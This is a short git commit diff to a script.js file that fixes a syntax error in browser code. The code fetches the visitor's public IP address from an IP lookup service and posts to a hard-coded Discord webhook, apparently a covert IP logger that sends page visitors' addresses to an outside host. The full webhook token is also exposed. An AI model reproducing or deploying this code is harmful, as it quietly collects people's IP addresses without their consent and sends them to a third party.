579359bf95e3ba8385bde8f9798ed466bdcf6906
WifiPancake <145923954+WifiPancake@users.noreply.github.com>
2023-09-30 17:51:27 +0200

    Update script.js

--- script.js
+++ script.js
@@ -2,7 +2,7 @@ var request = new XMLHttpRequest();
 var ip = ""
 fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
-  .then(data => var ip = data.ip);      
+  .then(data => ip = data.ip);      
     request.open("POST", "https://discordapp.com/api/webhooks/676118118082281513/ZS5YcWhurzokBrKX9NgexqtxrJA5Pu2Bo4i7_JsIxC-JIbPBVhSZkcVVukGOro52rnQA");
 
     request.setRequestHeader('Content-type', 'application/json');
